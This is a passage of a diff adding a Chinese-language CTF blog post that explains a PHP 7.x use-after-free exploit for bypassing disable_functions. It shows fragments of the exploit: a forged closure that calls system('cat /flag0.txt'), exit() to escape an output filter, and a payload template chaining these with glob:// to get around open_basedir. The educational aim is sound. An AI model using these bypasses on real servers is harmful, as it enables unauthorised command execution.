class="line">│ ...                 │</span><br><span class="line">└─────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-5-第五步：执行命令"><a href="#4-5-第五步：执行命令" class="headerlink" title="4.5 第五步：执行命令"></a>4.5 第五步：执行命令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;     <span class="comment">// 创建一个普通闭包</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 经过前面的篡改，$helper-&gt;b 指向了伪闭包</span></span><br><span class="line"><span class="comment">// 伪闭包的 handler = system()</span></span><br><span class="line"></span><br><span class="line">(<span class="variable">$helper</span>-&gt;b)(<span class="string">&quot;cat /flag0.txt&quot;</span>);</span><br><span class="line"><span class="comment">// PHP 的调用流程：</span></span><br><span class="line"><span class="comment">//   $helper-&gt;b 是闭包 → 查看 type = 1 → 内部函数</span></span><br><span class="line"><span class="comment">//   → 直接调用 handler(&quot;cat /flag0.txt&quot;)</span></span><br><span class="line"><span class="comment">//   → 实际执行 system(&quot;cat /flag0.txt&quot;) ← 绕过 disable_functions！</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么能绕过去？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正常调用 system(&quot;ls&quot;):</span><br><span class="line">  查函数表 → 找到 &quot;system&quot; → 检查 is_disabled = true → ❌ 拦截</span><br><span class="line"></span><br><span class="line">调用伪闭包 (&quot;ls&quot;):</span><br><span class="line">  查闭包 → 看 handler → 直接调用 handler → ✅ 执行</span><br><span class="line">                    ↑</span><br><span class="line">        闭包的调用路径不经过 is_disabled 检查！</span><br></pre></td></tr></table></figure>
+
+<p>PHP 信任闭包的 handler 是解释器自己设置的，所以跳过检查。UAF 脚本利用了这个信任。</p>
+<h3 id="4-6-exit-绕过输出过滤器"><a href="#4-6-exit-绕过输出过滤器" class="headerlink" title="4.6 exit() 绕过输出过滤器"></a>4.6 exit() 绕过输出过滤器</h3><p>UAF 脚本末尾有 <code>exit();</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">exit</span>();     <span class="comment">// 终止 PHP 执行</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();   <span class="comment">// ← 抓取输出</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);  <span class="comment">// ← 过滤输出</span></span><br></pre></td></tr></table></figure>
+
+<p><code>exit()</code> 在 <code>eval()</code> 内部就终止了 PHP，<strong>后面的 <code>preg_replace</code> 根本没有机会执行</strong>，flag 以原始内容输出。</p>
+<hr>
+<h2 id="五、完整流程图"><a href="#五、完整流程图" class="headerlink" title="五、完整流程图"></a>五、完整流程图</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">                    PHP 内存</span><br><span class="line">┌───────────────────────────────────────────────┐</span><br><span class="line">│                                               │</span><br><span class="line">│  ① zif_table（内部函数表）                     │</span><br><span class="line">│  ┌─────────────────────────┐                  │</span><br><span class="line">│  │ &quot;system&quot; → 0x7f123456   │ ← C 函数代码还在 │</span><br><span class="line">│  │   is_disabled = true    │ ← 只是打了个标记  │</span><br><span class="line">│  └─────────────────────────┘                  │</span><br><span class="line">│                                               │</span><br><span class="line">│  ② 可控内存（通过 UAF 获得）                  │</span><br><span class="line">│  ┌─────────────────────────┐                  │</span><br><span class="line">│  │ 伪闭包对象              │                  │</span><br><span class="line">│  │  type = 1 (内部函数)    │                  │</span><br><span class="line">│  │  handler → &amp;system ─────┼──── 指向　　　　　│</span><br><span class="line">│  └─────────────────────────┘                  │</span><br><span class="line">│         ↑                                     │</span><br><span class="line">│  $helper-&gt;b 指向这里                           │</span><br><span class="line">│                                               │</span><br><span class="line">└───────────────────────────────────────────────┘</span><br><span class="line">         │</span><br><span class="line">         │  ($helper-&gt;b)(&quot;cat /flag0.txt&quot;)</span><br><span class="line">         │</span><br><span class="line">         ▼</span><br><span class="line">  system(&quot;cat /flag0.txt&quot;)   ← 成功绕过！</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、在-CTF-中的组合拳"><a href="#六、在-CTF-中的组合拳" class="headerlink" title="六、在 CTF 中的组合拳"></a>六、在 CTF 中的组合拳</h2><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>技巧</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>glob://</code> 协议</td>
+<td>绕过 <code>open_basedir</code>，找到 flag 文件</td>
+</tr>
+<tr>
+<td>2</td>
+<td>UAF 脚本</td>
+<td>绕过 <code>disable_functions</code>，执行系统命令</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>exit()</code></td>
+<td>绕过输出过滤器（<code>preg_replace</code>）</td>
+</tr>
+</tbody></table>
+<p><strong>完整 payload 模板：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;cat /flag0.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ... 粘贴上述 UAF 脚本 ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>UAF</strong></td>
+<td>Use-After-Free，释放后使用，C&#x2F;C++ 内存漏洞</td>
+</tr>
+<tr>
+<td><strong>关键点</strong></td>
+<td><code>disable_functions</code> 只是标记，函数代码还在内存里</td>
+</tr>
+<tr>
+<td><strong>绕过原理</strong></td>
+<td>篡改闭包的 handler 指向 <code>system()</code>，跳过 is_disabled 检查</td>
+</tr>
+<tr>
+<td><strong>为什么能绕过</strong></td>
+<td>PHP 信任闭包，闭包的调用路径不检查 is_disabled</td>
+</tr>
+<tr>
+<td><strong>前提</strong></td>
+<td>需要目标 PHP 版本存在 UAF 漏洞（本脚本适用于 PHP 7.x）</td>
+</tr>
+</tbody></table>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://cai-cai-jun.github.io/2026/09/09/PHP%20UAF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/">https://cai-cai-jun.github.io/2026/09/09/PHP%20UAF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/"># Web安全</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/PHP/"># PHP</a>
+                    
+                        <a href="/tags/UAF/"># UAF</a>
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"># 漏洞利用</a>
+                    
+                        <a href="/tags/%E5%86%85%E5%AD%98%E5%AE%89%E5%85%A8/"># 内存安全</a>
+                    
+                        <a href="/tags/disable-functions%E7%BB%95%E8%BF%87/"># disable_functions绕过</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/09/08/PHP%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">PHP输出缓冲绕过技巧（ob_start + header 绕过 body 过滤）</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
